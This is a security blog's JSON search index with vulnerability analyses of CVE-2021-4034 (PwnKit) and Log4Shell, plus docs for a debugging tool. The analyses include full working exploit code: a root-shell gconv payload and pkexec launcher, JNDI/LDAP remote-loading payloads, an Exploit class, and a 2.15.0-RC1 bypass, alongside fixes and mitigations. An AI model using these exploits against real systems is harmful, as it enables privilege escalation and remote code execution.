{"pages":[{"title":"About Me","text":"Email: 4xpl0r3r@gmail.com Coming soon…","link":"/about/index.html"},{"title":"Error 404 - Page Not Found","text":"Click me to return to home page","link":"/404.html"}],"posts":[{"title":"Vulnerability-Analysis - CVE-2021-4034 Linux Polkit Privilege Escalation","text":"The major reference: Qualys’ Advisory This article is also available in 简体中文. Vulnerabilty Profile2022-01-25，The Exploit details of CVE-2021-4034 released, the vulnerabilty is found by Qualys Security Team in the pkexec , which is a component of the polkit suite. pkexec application is a tool to set uid, allowing a common user to execute a command as a privileged user according to a pre-defined policy. All mainstream Linux systems have this tool installed in default, and it’s executable has SUID bit set to work. All pkexec versions since the first version in May 2009 are vulnerable to this. The commit: Add a pkexec(1) command (c8c3d835) · Commits · polkit / polkit · GitLab Due to the widespread use of pkexec, the exploit of this vulnerability works in nearly all current Linux distributions with a wide range of effectiveness Vulnerabilty AnalysisPlease read the offical advisory: Qualys’ Advisory In summary, we need 2 environment variable to exploit the vulnerabilty. First one is set to a arbitrary string, such as x, the second one is set to PATH=GCONV_PATH=., which will be concat with /x and the command to execute will become GCONV_PATH=./x. After running GCONV_PATH=./x, we reintroduced an insecure environment which leads to privilege escalation. The ExploitI installed a Ubuntu 20.04, and found the version of its pkexec is 0.105, which is vulnerable. Firstly, we need to build a evil shared library, which is used to obtain the privileged shell. The code is as shown below 1234567#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void gconv() {}void gconv_init() { setuid(0); seteuid(0); setgid(0); setegid(0); system(&quot;PATH=/bin:/usr/bin:/sbin /bin/sh&quot;);} Build it 1gcc -shared -fPIC payload.c -o payload.so The exploit the LC_MESSAGES is used to set the charset set the XAUTHORITY to a illegal value to skip the normal execution, we only need the log function to exploit the vulnerabilty. 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;int main() { char* _argv[]={ NULL }; char* _envp[]={ &quot;x&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;LC_MESSAGES=en_US.UTF-8&quot;, &quot;XAUTHORITY=..&quot;, NULL }; mkdir(&quot;GCONV_PATH=.&quot;, 0777); mkdir(&quot;x&quot;, 0777); FILE *fp = fopen(&quot;x/gconv-modules&quot;, &quot;wb&quot;); fprintf(fp, &quot;module UTF-8// INTERNAL ../payload 2\\n&quot;); fclose(fp); fp = fopen(&quot;GCONV_PATH=./x&quot;, &quot;wb&quot;); fclose(fp); chmod(&quot;GCONV_PATH=./x&quot;,0777); execve(&quot;/usr/bin/pkexec&quot;, _argv, _envp);} Build it 1gcc exploit.c -o exp.out Run ./exp.out and you will get the privileged shell. Fix the VulnerabiltyThe modification: pkexec: local privilege escalation (CVE-2021-4034) (a2bf5c9c) · Commits · polkit / polkit · GitLab As we can see, if the value of argc is less than 1, the program will exit directly.","link":"/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-4034-Linux-Polkit-Privilege-Escalation/"},{"title":"Vulnerability Analysis - CVE-2021-44228 Log4Shell","text":"Using Java 8u181 This article is also available in 简体中文. Vulnerability ProfileApache Log4j2 is a logging tool. Because Apache Log4j2 offers some functions that could parse recursively, an attacker can directly construct a malicious request to trigger the remote code execution.The vulnerability works with default configuration. Verified by the Ali Cloud security team, It is affected for Apache Struts2, Apache Solr, Apache Druid, Apache Flink, etc. All systems running Apache log4j2 2.0-beta9 through 2.14.1 are vulnerable. If the Java application imports the log4j-core, it is most likely to be affected. The ExploitThe Exploit CodeUse the maven to build a project to trigger the vulnerability and import the org.apache.logging.log4j module which version is 2.14.1 . If the logger uses a recordable level to log the payload , the vulnerability will be triggered. The trigger code is as shown below. 12345678import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;public class Main { private static final Logger logger = LogManager.getLogger(); public static void main(String[] args) { logger.error(&quot;${jndi:ldap://ip:1389/#Exploit}123&quot;); }} Use the code shown below to build a class file used by JNDI 123456789101112131415161718192021222324252627282930313233343536import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.io.Reader;public class Exploit{ public Exploit() throws IOException,InterruptedException{ String cmd=&quot;curl 127.0.0.1:5555&quot;; final Process process = Runtime.getRuntime().exec(cmd); printMessage(process.getInputStream());; printMessage(process.getErrorStream()); int value=process.waitFor(); System.out.println(value); } private static void printMessage(final InputStream input) { new Thread (new Runnable() { @Override public void run() { // TODO Auto-generated method stub Reader reader =new InputStreamReader(input); BufferedReader bf = new BufferedReader(reader); String line = null; try { while ((line=bf.readLine())!=null) { System.out.println(line); } }catch (IOException e){ e.printStackTrace(); } } }).start(); }} Compile the code to get the .class file. The construction method will be run by JNDI. Trigger the vulnerabilityIt’s typical JNDI Injection progress. Firstly, move the .class file to a web server, and then, make use of marshalsec to set up JNDI and LDAP service, the command is as shown below 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/#Exploit Analysis of the VulnerabiltyAnalysis of the source codeAs we all know, the exploit is working with JNDI, so we make a breakpoint in the constrution method of javax.naming.InitialContext . The source code is located in rt.jar/javax/naming/InitialContext.java After running the trigger code, the execution will be paused at the breakpoint. The calling stack is as shown below It’s obviously that if we want to exploit with JNDI, there must be a calling for lookup method, so let’s trace reversely form JndiLookup.look(). To determine where is the code that focus to the payload ${jndi:ldap://127.0.0.1:1389/#Exploit}, we can add some junk into the logging message. Running the trigger again, we can find that the substitute methond deferenced AAAAA${jndi:ldap://127.0.0.1:1389/#Exploit}BBBBB into ${jndi:ldap://127.0.0.1:1389/#Exploit}. Apart from this, we can find there is a method called resolveVariable which is using to parse variable wrapper with ${}. Keep tracing, we can find a piece of code as below We can find that if it meet the variable starting with ${, the code will replace it with the resolved variable. Going deeperLog4j2 has 3 major components. Logger - log the message Appender - output the message Layout - format the message Keep tracing the calling stack, we can find that log4j2 use LoggerConfig.processLogEvent() to resolve logging event, use callAppenders() to call Appender to ouput the message. The function of Appender is transfer the logging event to the target. There are some commonly used Appender such as ConsoleAppender(output to the console), FileAppender(output to a file). It will use AppenderControl to gain the specific Appender. In this debug session, it is ConsoleAppender. The Appender uses the Layout to get the logging format, formats the logging message with Layout.encode(). The Layout will use formatters to finish the formating. The inputted message is resolved by MessagePatternConverter.format(), it’s a important part of the vulnerabilty. When the config is exist and the noLookups is false, if there is a ${' in the message, it will call workingBuilder.append() to get the StrSubstitutor to replace the variable with resolved one We can find there is a noLookups which is a value of configuration, the default value of it is the false. We will make use of it to temporarily fix the vulnerabilty later. Going forward, we can find the StrSubstitutor.resolveVariable() , it is used to resolve and parse, suporting the protocols incluing JNDI as below Mitigation - Disable Lookups with System configuration We can check the cross reference to determine where the noLookups was assigned, it is as below As a example, I add a line of code to change the system configration, it could also be set by command line or .properties configration file. 12345678910 import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import java.lang.*;public class Main { public static void main(String[] args) { System.setProperty(&quot;log4j2.formatMsgNoLookups&quot;,&quot;true&quot;); final Logger logger = LogManager.getLogger(); logger.error(&quot;AAAAA${jndi:ldap://127.0.0.1:1389/#Exploit}BBBBBB&quot;); }} Run the trigger code again, we can find that ${jndi:ldap://127.0.0.1:1389/#Exploit} won’t be parsed Mitigation - Disable Lookups with Log4j Configuration In my opinion, it’s the best way to protect the system without upgrading The official documet: Log4j – Configuring Log4j 2 (apache.org) The MVP(Minimum Viable Product) of configuration in XML is as shown below. 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;PatternLayout pattern=&quot;[%t] %-5level %m{nolookups} %n&quot;/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;info&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; Apart from XML, the Log4j also support other formats such as json. Thinking - Why the Log4j2 needs the capability of JNDIAfter checking the official documents Log4j – Configuring Log4j 2 - Apache Log4j 2,I found the Property Substitution function, it offers the capability to retrieve attributes remotely to make the logging information more abundant Because the developers didn’t aware the potential harm, the default value of noLookups was set to false and the source of JNDI wasn’t been restricted. Something elseThe common false positiveMany tester determine if the system is vulnerable to the CVE-2021-44228 by checking the DNS request, it’s not rigorous. Many Public Service could send the DNS request for the domian in the payload to take spam intercepting or any else, so the DNS request can’t be the evidence of vulnerabilty. There is a better method to check, just insert the ${sys:java.version} into the subdomain, it will be much more accurate. How to defense Upgrade the log4j2 Disable Lookups with System configuration Disable Lookups with Log4j Configuration The official fixing https://logging.apache.org/log4j/2.x/changes-report.html As shown above, in Release 2.15.0, it disabled the lookups by default and limit the servers and classes that can be accessed via LDAP. What’s more, In release 2.16.0, disable JNDI by default. Require log4j2.enableJndi to be set to true to allow JNDI and completely remove support for Message Lookups. The Bypassing in log4j 2.15.0-RC1CompilingBecause the 2.15.0-RC1 don’t exist in the maven repository, we have to get the source code from GitHub and compile it manually. Tags · apache/logging-log4j2 (github.com) According to the README.md, configure the jdk in the toolschains files and we only need the packages for jdk1.8, so just comment out the others. Because we don’t need all the modules, modify the modules in pom.xml as shown below 12345678910111213141516171819202122232425262728293031323334353637&lt;modules&gt; &lt;!-- &lt;module&gt;log4j-api-java9&lt;/module&gt; --&gt; &lt;module&gt;log4j-api&lt;/module&gt; &lt;!-- &lt;module&gt;log4j-core-java9&lt;/module&gt; --&gt; &lt;module&gt;log4j-core&lt;/module&gt; &lt;!-- &lt;module&gt;log4j-layout-template-json&lt;/module&gt; &lt;module&gt;log4j-core-its&lt;/module&gt; &lt;module&gt;log4j-1.2-api&lt;/module&gt; &lt;module&gt;log4j-slf4j-impl&lt;/module&gt; &lt;module&gt;log4j-slf4j18-impl&lt;/module&gt; &lt;module&gt;log4j-to-slf4j&lt;/module&gt; &lt;module&gt;log4j-jcl&lt;/module&gt; &lt;module&gt;log4j-flume-ng&lt;/module&gt; &lt;module&gt;log4j-taglib&lt;/module&gt; &lt;module&gt;log4j-jmx-gui&lt;/module&gt; &lt;module&gt;log4j-samples&lt;/module&gt; &lt;module&gt;log4j-bom&lt;/module&gt; &lt;module&gt;log4j-jdbc-dbcp2&lt;/module&gt; &lt;module&gt;log4j-jpa&lt;/module&gt; &lt;module&gt;log4j-couchdb&lt;/module&gt; &lt;module&gt;log4j-mongodb3&lt;/module&gt; &lt;module&gt;log4j-mongodb4&lt;/module&gt; &lt;module&gt;log4j-cassandra&lt;/module&gt; &lt;module&gt;log4j-web&lt;/module&gt; &lt;module&gt;log4j-jakarta-web&lt;/module&gt; &lt;module&gt;log4j-perf&lt;/module&gt; &lt;module&gt;log4j-iostreams&lt;/module&gt; &lt;module&gt;log4j-jul&lt;/module&gt; &lt;module&gt;log4j-jpl&lt;/module&gt; &lt;module&gt;log4j-liquibase&lt;/module&gt; &lt;module&gt;log4j-appserver&lt;/module&gt; &lt;module&gt;log4j-osgi&lt;/module&gt; &lt;module&gt;log4j-docker&lt;/module&gt; &lt;module&gt;log4j-kubernetes&lt;/module&gt; &lt;module&gt;log4j-spring-boot&lt;/module&gt; &lt;module&gt;log4j-spring-cloud-config&lt;/module&gt; --&gt;&lt;/modules&gt; To compile, the maven command to run is as below 12# set the env variable JAVA_HOME to the path of jdk1.8./mvnw clean install -t toolchains-sample-mac.xml -Dmaven.test.skip=true # skip tests to accelerate The generated artifacts (.jar) will be in the target directory of every module. Analysis of the source codeFirstly, change the version of log4j to 2.15.0 in the pom.xml, replace the packages .jar with the generated before. Because it disabled the lookups by default in 2.15.0, we have to enable it with configuration. Modify or create the log4j2.xml 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;PatternLayout pattern=&quot;[%t] %-5level %m{lookups} %n&quot;/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;info&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; Now, the payload as below will be parsed 1${sys:java.version} However, the payload for JNDI won’t be parsed 1${jndi:ldap://ip:1389/#Exploit} We know that the variable could be resolved but the JNDI has been restricted, let’s have a check with the process of variable resolving. Focus on StrSubstitutor.resolveVariable() Step into the lookup() We can find that the JNDI could be resolved as before, step into the lookup() again and check what is restricting the JNDI. Step into the lookup() of jndiManager We can find there are some restrictions about the protocol and source. As we found, the source has been restricted to some local IP, let’s assume that the restrict about source won’t afffect us as we are testing locally. Apart from this, we can find that the LDAP protocol is permitted. We can find that the Reference Object have been forbidden by attributeMap.get(OBJECT_FACTORY)!=null Apart from this, the another way to exploit with JNDI, deserialization, has been restricted too, it limited the classes to some basic type with allowedClasses as below Although it looks like perfect, but there is a vulnerability in the logic of exception handling If there is a URI with some error in syntax, it will skip all the assessment and execution will arrive the JNDI lookup.But, how to have a URI which have some error in syntax but could work as intended? Just add a space that didn’t encoded by urlencode as below 1${jndi:ldap://127.0.0.1:1389/# Exploit} Run the trigger code again, we can find that the command in exploit code works. Summary of the Bypassing The LookUps have to be enabled by developer The source of LDAP have to be in the permit list, but the permit list only contains some local address by default References Log4j Vulnerability (Log4Shell) Explained // CVE-2021-44228 - YouTube https://logging.apache.org/log4j/2.x/changes-report.html https://paper.seebug.org/1786/ https://www.anquanke.com/post/id/262668 Log4j – Configuring Log4j 2 (apache.org) https://xz.aliyun.com/t/10649#toc-2 JNDI with LDAP Serializable Objects (oracle.com) Referenceable Objects and References (oracle.com) https://www.icode9.com/content-4-1253127.html","link":"/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/"},{"title":"DIPD Document","text":"4xpl0r3r/DIPD: Debug with IDA and Pwntools in Docker (DIPD) (github.com) This article is also available in 简体中文. AboutWith this, you can debug a program in docker and make use of both IDA and Pwntools SAFT QUICK POWERFUL(IDA) Get Started1git clone https://github.com/4xpl0r3r/DIPD.git Install docker, docker-compose, and IDA (You can deploy them in separated hosts, but the network between them must be OK) move the binary to debug/ directory and rename the binary to todebug run the command docker-compose up in the root directory of this project Access to the STDIO of binary 1nc docker.ip 23458 IDA Pro Debugger Arguments (version 7.6) Type: Remote Linux Debugger (Attach) Hostname: docker.ip (the IP of your host which running docker) Port: 23946 No password need Caution You have to run the binary by netcat or pwntools before attaching the process, or you can’t see the desired process in your IDA You have to run the docker in a 64bit arch Linux to support both 32bit(i386) and 64bit(amd64) debug DemoStart the DIPD 1docker-compose up Run and connect to the STDIO of your binary 1nc docker.ip 23458 Now, your binary should have been running Let’s use our IDA and start the IDA Debugger Input Information and click “OK” Now you can see the processes in your docker, choose ./todebug and click “OK” Now, you should have got into IDA debug view without any error and exception. file - docker-compose.ymlimageYou can choose the base image as you like, here are some useful options 1234i386/ubuntu:16.04i386/ubuntu:18.04amd64/ubuntu:16.04amd64/ubuntu:18.04 You have to run your docker in 64bit Arch to support both i386 and amd64, or the only option is i386 Other argumentsJust have a look at the annotation over there directory - filesdirectory - debsthe apt packages for socat, used for fast install and offline support files - linux_server[64]IDA Debug Server v7.6 If you don’t want to use IDA v7.6, just replace them with yours file - init.shThis file is used for initializing the debug environment, you can modify it to make any adjustment directory - debugJust place the binary you want to debug here If you have an application isn’t having only 1 ELF file, just copy them all to this directory If you don’t want to change the name of your elf file, you could change the argument debug_name in docker-compose.yml","link":"/Docs/DIPD-Document/"}],"tags":[{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"C&amp;C++","slug":"C-C","link":"/tags/C-C/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Priv-Escalation","slug":"Priv-Escalation","link":"/tags/Priv-Escalation/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"JNDI","slug":"JNDI","link":"/tags/JNDI/"},{"name":"Format String","slug":"Format-String","link":"/tags/Format-String/"},{"name":"PWN","slug":"PWN","link":"/tags/PWN/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"Environment","slug":"Environment","link":"/tags/Environment/"}],"categories":[{"name":"Vuln-Analysis","slug":"Vuln-Analysis","link":"/categories/Vuln-Analysis/"},{"name":"Docs","slug":"Docs","link":"/categories/Docs/"}]}